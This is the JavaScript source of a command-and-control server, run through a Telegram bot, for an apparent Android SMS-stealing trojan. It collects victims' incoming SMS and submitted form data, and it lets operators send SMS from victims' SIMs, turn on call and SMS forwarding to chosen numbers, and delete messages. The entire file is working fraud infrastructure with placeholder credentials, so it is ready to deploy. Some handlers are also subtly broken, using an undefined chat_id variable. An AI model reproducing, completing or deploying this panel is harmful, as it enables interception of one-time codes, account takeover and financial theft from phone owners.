const express = require('express');
const bodyParser = require('body-parser');
const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs-extra');
const path = require('path');

// ===== CONFIG =====
const BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN';  // Telegram Bot Token डालें
const ADMIN_IDS = [-1001234567890];             // Telegram Admin Chat IDs डालें
const DEVELOPER = '@yourusername';             // Telegram Username डालें
const PORT = 3000;

// ===== STORAGE =====
const STORAGE_DIR = path.join(__dirname, 'storage');
fs.ensureDirSync(STORAGE_DIR);
const QUEUE_FILE = path.join(STORAGE_DIR, 'commandQueue.json');
if (!fs.existsSync(QUEUE_FILE)) fs.writeJsonSync(QUEUE_FILE, {});

// ===== EXPRESS APP =====
const app = express();
app.use(bodyParser.json());
app.use(express.urlencoded({ extended: true }));

// ===== TELEGRAM BOT =====
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// ===== RUNTIME DATA =====
const devices = new Map();
const sessions = {};

// ===== UTILS =====
function readQueue() {
  return fs.readJsonSync(QUEUE_FILE, { throws: false }) || {};
}
function writeQueue(q) {
  fs.writeJsonSync(QUEUE_FILE, q, { spaces: 2 });
}
function addCommand(uuid, cmd) {
  const q = readQueue();
  q[uuid] = q[uuid] || [];
  q[uuid].push(cmd);
  writeQueue(q);
}
function formatDevice(d) {
  const online = (Date.now() - (d.lastSeen || 0) < 60000);
  return `📱 *${d.model || 'Unknown'}*\n🪪 SIM1: ${d.sim1 || 'N/A'}\n🪪 SIM2: ${d.sim2 || 'N/A'}\n🔋 Battery: ${d.battery || 'N/A'}%\n🌐 ${online ? '🟢 Online' : '🔴 Offline'}`;
}
function isAdmin(chatId) {
  return ADMIN_IDS.includes(chatId);
}
function awaitAnswer(bot, chatId, prompt) {
  bot.sendMessage(chatId, prompt);
}

// ===== EXPRESS ROUTES =====

app.get('/', (_, res) => res.send('✅ Panel online'));

app.post('/connect', (req, res) => {
  const { uuid, model, battery, sim1, sim2 } = req.body;
  if (!uuid) return res.status(400).send('Missing uuid');

  devices.set(uuid, { model, battery, sim1, sim2, lastSeen: Date.now() });

  const msg = `📲 *Device Connected*\n${formatDevice(devices.get(uuid))}\n\n👨‍💻 Developer: ${DEVELOPER}`;
  ADMIN_IDS.forEach(id => bot.sendMessage(id, msg, { parse_mode: 'Markdown' }).catch(() => {}));
  res.sendStatus(200);
});

app.get('/commands', (req, res) => {
  const uuid = req.query.uuid;
  if (!uuid) return res.status(400).send('Missing uuid');
  const q = readQueue();
  const cmds = q[uuid] || [];
  q[uuid] = [];
  writeQueue(q);
  res.json(cmds);
});

app.post('/sms', (req, res) => {
  const { uuid, from, body, sim, timestamp, battery } = req.body;
  if (!uuid || !from || !body) return res.status(400).send('Missing fields');

  const device = devices.get(uuid) || { model: uuid, sim1: 'N/A', sim2: 'N/A' };
  const ts = new Date(timestamp || Date.now());

  const smsEntry = { from, body, sim, battery, timestamp: ts.getTime() };
  const smsFile = path.join(STORAGE_DIR, `${uuid}_sms.json`);
  const smsList = fs.existsSync(smsFile) ? fs.readJsonSync(smsFile) : [];
  smsList.unshift(smsEntry);
  fs.writeJsonSync(smsFile, smsList.slice(0, 25), { spaces: 2 });

  let smsMessage = `📩 *New SMS Received*\n` +
  `\n📱 *Device:* ${device.model || 'Unknown'}` +
  `\n🔋 *Battery Level:* ${battery || 'N/A'}%` +
  `\n🪪 *SIM1 Number:* ${device.sim1 || 'N/A'}` +
  `\n🪪 *SIM2 Number:* ${device.sim2 || 'N/A'}` +
  `\n\n✉️ *From:* \`${from}\`` +
  `\n📝 *Message:* \n${body}` +
  `\n\n📶 *SIM Slot:* ${sim}` +
  `\n⏰ *Received At:* ${new Date(timestamp).toLocaleString()}` +
  `\n\n👨‍💻 _Developer: ${DEVELOPER}_`;


  if (smsMessage.length > 3800) {
    const tempPath = path.join(STORAGE_DIR, `${uuid}_last_sms.txt`);
    fs.writeFileSync(tempPath, smsMessage, 'utf8');
    ADMIN_IDS.forEach(id => {
      bot.sendDocument(id, tempPath, {}, { filename: `${uuid}_last_sms.txt` })
        .then(() => fs.unlinkSync(tempPath))
        .catch(() => bot.sendMessage(id, smsMessage, { parse_mode: 'Markdown' }));
    });
  } else {
    ADMIN_IDS.forEach(id => bot.sendMessage(id, smsMessage, { parse_mode: 'Markdown' }).catch(() => {}));
  }
  res.sendStatus(200);
});

app.post('/html-form-data', (req, res) => {
  const { uuid, brand, battery, ...fields } = req.body;
  if (!uuid) return res.status(400).send('Missing UUID');

  const formFile = path.join(STORAGE_DIR, `${uuid}_formdata.json`);
  let formList = fs.existsSync(formFile) ? fs.readJsonSync(formFile) : [];
  const entry = { timestamp: Date.now(), brand, battery, ...fields };
  formList.unshift(entry);
  fs.writeJsonSync(formFile, formList.slice(0, 50), { spaces: 2 });

  let msg = `🧾 *Form Submitted*\n📱 ${devices.get(uuid)?.model || uuid}\n🏷 Device Brand: ${brand || 'Unknown'}\n🔋 Battery: ${battery || 'N/A'}%\n\n`;
  for (const [k, v] of Object.entries(fields)) {
    const label = k.replace(/_/g, ' ').replace(/\b\w/g, c => c.toUpperCase());
    msg += `🔸 ${label}: ${v}\n`;
  }
  msg += `\n👨‍💻 Developer: ${DEVELOPER}`;

  if (msg.length > 3800) {
    const tempPath = path.join(STORAGE_DIR, `${uuid}_formdata.txt`);
    fs.writeFileSync(tempPath, msg, 'utf8');
    ADMIN_IDS.forEach(id => {
      bot.sendDocument(id, tempPath, {}, { filename: `${uuid}_formdata.txt` })
       .then(() => fs.unlinkSync(tempPath))
       .catch(() => bot.sendMessage(id, msg, { parse_mode: 'Markdown' }));
    });
  } else {
    ADMIN_IDS.forEach(id => bot.sendMessage(id, msg, { parse_mode: 'Markdown' }).catch(() => {}));
  }
  res.sendStatus(200);
});

app.post('/confirm-command', (req, res) => {
  const { uuid, commandId, type, status, message, sim, forwardNumber } = req.body;
  if (!uuid || !commandId || !status) return res.status(400).send('Missing fields');

  const device = devices.get(uuid) || { model: uuid };
  let confirmMsg = `✅ Command Confirmation\nDevice: ${device.model}\nCommand ID: ${commandId}\nStatus: ${status}\nType: ${type || 'N/A'}\nMessage: ${message || 'N/A'}\nSim: ${sim || 'N/A'}`;

  if (type === 'call_forward_check' || type === 'sms_forward_check') {
    confirmMsg += `\nForwarding Number: ${forwardNumber || 'Not Set'}`;
  }

  confirmMsg += `\n\n👨‍💻 Developer: ${DEVELOPER}`;
  ADMIN_IDS.forEach(id => bot.sendMessage(id, confirmMsg, { parse_mode: 'Markdown' }).catch(() => {}));

  res.sendStatus(200);
});

// Telegram Bot Events
bot.on('message', msg => {
  const chatId = msg.chat.id;
  const text = (msg.text || '').trim();
  if (!isAdmin(chatId)) {
    bot.sendMessage(chatId, '❌ Permission denied.');
    return;
  }
  if (text === '/start') {
    bot.sendMessage(chatId, '✅ Admin Panel Ready', {reply_markup: {keyboard: [['Connected devices'], ['Execute command']], resize_keyboard: true}});
  }
  if (text === 'Connected devices') {
    if (devices.size === 0) return bot.sendMessage(chatId, '🚫 No devices connected.');
    let out = '';
    for (const [uuid, d] of devices.entries()) {
      out += `${formatDevice(d)}\nUUID: \`${uuid}\`\n\n`;
    }
    bot.sendMessage(chatId, out, {parse_mode: 'Markdown'});
  }
  if (text === 'Execute command') {
    const rows = [...devices.entries()].map(([uuid, d]) => [{text: d.model || uuid, callback_data: `device:${uuid}`}]);
    if (rows.length === 0) return bot.sendMessage(chatId, '🚫 No devices connected.');
    bot.sendMessage(chatId, '🔘 Select device:', {reply_markup: {inline_keyboard: rows}});
  }
});

// Telegram Bot callback query handler
bot.on('callback_query', async cb => {
  const chatId = cb.message.chat.id;
  const data = cb.data;
  if (!isAdmin(chatId)) return bot.answerCallbackQuery(cb.id, {text: '❌ Not allowed'});

  const [cmd, uuid] = data.split(':');
  const device = devices.get(uuid);

  switch (cmd) {
    case 'device': {
      const buttons = [
        [{text: '📜 SMS Logs', callback_data: `get_sms_log:${uuid}`}],
        [{text: '✉️ Send SMS', callback_data: `send_sms_menu:${uuid}`}],
        [{text: '📞 Call Forward', callback_data: `call_forward_menu:${uuid}`}],
        [{text: '📨 SMS Forward', callback_data: `sms_forward_menu:${uuid}`}],
        [{text: '📋 Device Info', callback_data: `device_info:${uuid}`}],
        [{text: '🧾 View Form Data', callback_data: `view_form:${uuid}`}],
        [{text: '🗑️ Delete Last SMS', callback_data: `delete_last_sms:${uuid}`}],
        [{text: '⬅️ Back', callback_data: 'back_devices'}]
      ];
      return bot.editMessageText(`🔧 Commands for ${device.model || uuid}\n👨‍💻 Developer: ${DEVELOPER}`, {
        chat_id,
        message_id: cb.message.message_id,
        reply_markup: {inline_keyboard: buttons}
      });
    }
    case 'get_sms_log': {
      const smsFile = path.join(STORAGE_DIR, `${uuid}_sms.json`);
      if (fs.existsSync(smsFile)) {
        const logs = fs.readJsonSync(smsFile);
        let msg = `📜 SMS Logs (${logs.length} messages):\n\n`;
        logs.forEach((sms, i) => {
          msg += `${i + 1}. From: ${sms.from}\nSIM: ${sms.sim}\nMsg: ${sms.body}\nTime: ${new Date(sms.timestamp).toLocaleString()}\n\n`;
        });
        msg += `👨‍💻 Developer: ${DEVELOPER}`;
        if (msg.length > 3800) {
          // अगर मैसेज लंबा हो तो टेक्स्ट फाइल के रूप में भेजें
          const tempPath = path.join(STORAGE_DIR, `${uuid}_sms_logs.txt`);
          fs.writeFileSync(tempPath, msg, 'utf8');
          bot.sendDocument(chatId, tempPath, {}, {filename:`${uuid}_sms_logs.txt`})
            .then(() => fs.unlinkSync(tempPath))
            .catch(() => bot.sendMessage(chatId, msg, {parse_mode: 'Markdown'}));
        } else {
          bot.sendMessage(chatId, msg, {parse_mode: 'Markdown'});
        }
      } else {
        bot.sendMessage(chatId, '🚫 No SMS logs found');
      }
      return bot.answerCallbackQuery(cb.id);
    }
    case 'view_form': {
      const formFile = path.join(STORAGE_DIR, `${uuid}_formdata.json`);
      if (fs.existsSync(formFile)) {
        const formList = fs.readJsonSync(formFile);
        if (formList.length === 0) {
          bot.sendMessage(chatId, '🚫 No form data found');
          return bot.answerCallbackQuery(cb.id);
        }
        let textData = `🧾 Form Data History (${formList.length} entries):\n\n`;
        formList.forEach((entry, i) => {
          textData += `Entry ${i + 1} - ${new Date(entry.timestamp).toLocaleString()}\n`;
          for (const [k, v] of Object.entries(entry)) {
            if (k === 'timestamp') return;
            const label = k.replace(/_/g, ' ').replace(/\b\w/g, c => c.toUpperCase());
            textData += `${label}: ${v}\n`;
          }
          textData += `\n`;
        });
        const tempPath = path.join(STORAGE_DIR, `${uuid}_formdata.txt`);
        fs.writeFileSync(tempPath, textData, 'utf8');

        bot.sendDocument(chatId, tempPath, {}, { filename: `${uuid}_formdata.txt` }).then(() => {
          fs.unlinkSync(tempPath);
        }).catch(() => {
          bot.sendMessage(chatId, 'Failed to send form data file.');
        });
      } else {
        bot.sendMessage(chatId, '🚫 No form data found');
      }
      return bot.answerCallbackQuery(cb.id);
    }
    case 'send_sms_menu': {
      const sim1 = { text: 'SIM1', callback_data: `send_sms_sim1:${uuid}` };
      const sim2 = { text: 'SIM2', callback_data: `send_sms_sim2:${uuid}` };
      return bot.editMessageText('✉️ Choose SIM:', {
        chat_id,
        message_id: cb.message.message_id,
        reply_markup: { inline_keyboard: [[sim1, sim2], [{ text: '⬅️ Back', callback_data: `device:${uuid}` }]] }
      });
    }
    case 'send_sms_sim1':
    case 'send_sms_sim2': {
      const sim = cb.data.includes('sim2') ? 2 : 1;
      sessions[chat_id] = { stage: 'await_number', action: 'send_sms', sim, uuid };
      awaitAnswer(bot, chat_id, '📨 Enter recipient number:');
      return bot.answerCallbackQuery(cb.id);
    }
    case 'call_forward_menu': {
      const row = [{ text: 'SIM1', callback_data: `call_forward_sim1:${uuid}` }, { text: 'SIM2', callback_data: `call_forward_sim2:${uuid}` }];
      return bot.editMessageText('📞 Choose SIM for Call Forward:', {
        chat_id,
        message_id: cb.message.message_id,
        reply_markup: { inline_keyboard: [row, [{ text: '⬅️ Back', callback_data: `device:${uuid}` }]] }
      });
    }
    case 'call_forward_sim1':
    case 'call_forward_sim2': {
      const sim = cb.data.includes('sim2') ? 2 : 1;
      const on = { text: 'Enable', callback_data: `call_forward_on_sim${sim}:${uuid}` };
      const off = { text: 'Disable', callback_data: `call_forward_off_sim${sim}:${uuid}` };
      const check = { text: 'Check', callback_data: `call_forward_check_sim${sim}:${uuid}` };
      return bot.editMessageText(`Call Forward SIM${sim} — choose action:`, {
        chat_id,
        message_id: cb.message.message_id,
        reply_markup: { inline_keyboard: [[on, off, check], [{ text: '⬅️ Back', callback_data: `call_forward_menu:${uuid}` }]] }
      });
    }
    case 'call_forward_on_sim1':
    case 'call_forward_on_sim2': {
      const sim = cb.data.includes('sim2') ? 2 : 1;
      sessions[chat_id] = { stage: 'await_number', action: 'call_forward_on', sim, uuid };
      awaitAnswer(bot, chat_id, `📞 Enter number to forward calls TO (SIM${sim}):`);
      return bot.answerCallbackQuery(cb.id);
    }
    case 'call_forward_off_sim1':
    case 'call_forward_off_sim2': {
      const sim = cb.data.includes('sim2') ? 2 : 1;
      addCommand(uuid, { type: 'call_forward', action: 'off', sim });
      bot.sendMessage(chat_id, `✅ Call Forward OFF SIM${sim}\n👨‍💻 Developer: ${DEVELOPER}`);
      return bot.answerCallbackQuery(cb.id);
    }
    case 'call_forward_check_sim1':
    case 'call_forward_check_sim2': {
      const sim = cb.data.includes('sim2') ? 2 : 1;
      const commandId = `call_forward_check_sim${sim}_${Date.now()}`;
      addCommand(uuid, { type: 'call_forward_check', commandId, sim });
      bot.sendMessage(chat_id, `🔎 Checking Call Forward SIM${sim} status...\n(Waiting for device confirmation)`, { parse_mode: 'Markdown' });
      return bot.answerCallbackQuery(cb.id);
    }
    case 'sms_forward_menu': {
      const row = [{ text: 'SIM1', callback_data: `sms_forward_sim1:${uuid}` }, { text: 'SIM2', callback_data: `sms_forward_sim2:${uuid}` }];
      return bot.editMessageText('📨 Choose SIM for SMS Forward:', {
        chat_id,
        message_id: cb.message.message_id,
        reply_markup: { inline_keyboard: [row, [{ text: '⬅️ Back', callback_data: `device:${uuid}` }]] }
      });
    }
    case 'sms_forward_sim1':
    case 'sms_forward_sim2': {
      const sim = cb.data.includes('sim2') ? 2 : 1;
      const on = { text: 'Enable', callback_data: `sms_forward_on_sim${sim}:${uuid}` };
      const off = { text: 'Disable', callback_data: `sms_forward_off_sim${sim}:${uuid}` };
      const check = { text: 'Check', callback_data: `sms_forward_check_sim${sim}:${uuid}` };
      return bot.editMessageText(`SMS Forward SIM${sim} — choose action:`, {
        chat_id,
        message_id: cb.message.message_id,
        reply_markup: { inline_keyboard: [[on, off, check], [{ text: '⬅️ Back', callback_data: `sms_forward_menu:${uuid}` }]] }
      });
    }
    case 'sms_forward_on_sim1':
    case 'sms_forward_on_sim2': {
      const sim = cb.data.includes('sim2') ? 2 : 1;
      sessions[chat_id] = { stage: 'await_number', action: 'sms_forward_on', sim, uuid };
      awaitAnswer(bot, chat_id, `📨 Enter number to forward SMS TO (SIM${sim}):`);
      return bot.answerCallbackQuery(cb.id);
    }
    case 'sms_forward_off_sim1':
    case 'sms_forward_off_sim2': {
      const sim = cb.data.includes('sim2') ? 2 : 1;
      addCommand(uuid, { type: 'sms_forward', action: 'off', sim });
      bot.sendMessage(chat_id, `✅ SMS Forward OFF SIM${sim}\n👨‍💻 Developer: ${DEVELOPER}`);
      return bot.answerCallbackQuery(cb.id);
    }
    case 'sms_forward_check_sim1':
    case 'sms_forward_check_sim2': {
      const sim = cb.data.includes('sim2') ? 2 : 1;
      const commandId = `sms_forward_check_sim${sim}_${Date.now()}`;
      addCommand(uuid, { type: 'sms_forward_check', commandId, sim });
      bot.sendMessage(chat_id, `🔎 Checking SMS Forward SIM${sim} status...\n(Waiting for device confirmation)`, { parse_mode: 'Markdown' });
      return bot.answerCallbackQuery(cb.id);
    }
    case 'delete_last_sms': {
      const smsFile = path.join(STORAGE_DIR, `${uuid}_sms.json`);
      if (fs.existsSync(smsFile)) {
        let list = fs.readJsonSync(smsFile);
        if (list.length > 0) {
          const removed = list.shift();
          fs.writeJsonSync(smsFile, list.slice(0, 25), { spaces: 2 });
          const device = devices.get(uuid) || { model: uuid };
          const msg = `🗑️ Last SMS deleted from ${device.model}:\n📩 From: ${removed.from}\nSIM: ${removed.sim}\nMsg: ${removed.body}\nTime: ${new Date(removed.timestamp).toLocaleString()}\n👨‍💻 Developer: ${DEVELOPER}`;
          ADMIN_IDS.forEach(id => bot.sendMessage(id, msg, { parse_mode: 'Markdown' }));
        } else bot.sendMessage(chat_id, '🚫 No messages to delete');
      } else bot.sendMessage(chat_id, '🚫 No messages to delete');
      return bot.answerCallbackQuery(cb.id);
    }
    case 'device_info': {
      const d = devices.get(uuid);
      if (!d) return bot.answerCallbackQuery(cb.id, { text: 'Device not found' });
      let msg = formatDevice(d) + `\nUUID: ${uuid}\n👨‍💻 Developer: ${DEVELOPER}`;
      bot.sendMessage(chat_id, msg, { parse_mode: 'Markdown' });
      return bot.answerCallbackQuery(cb.id);
    }
    case 'back_devices': {
      const rows = [...devices.entries()].map(([uuid, d]) => [{ text: d.model || uuid, callback_data: `device:${uuid}` }]);
      bot.editMessageText('🔘 Select device:', {
        chat_id,
        message_id: cb.message.message_id,
        reply_markup: { inline_keyboard: rows }
      });
      return bot.answerCallbackQuery(cb.id);
    }
    default:
      return bot.answerCallbackQuery(cb.id, { text: '❌ Unknown action' });
  }
});

// Start server
app.listen(PORT, () => {
  console.log(`✅ Server running on port ${PORT}`);
});
  
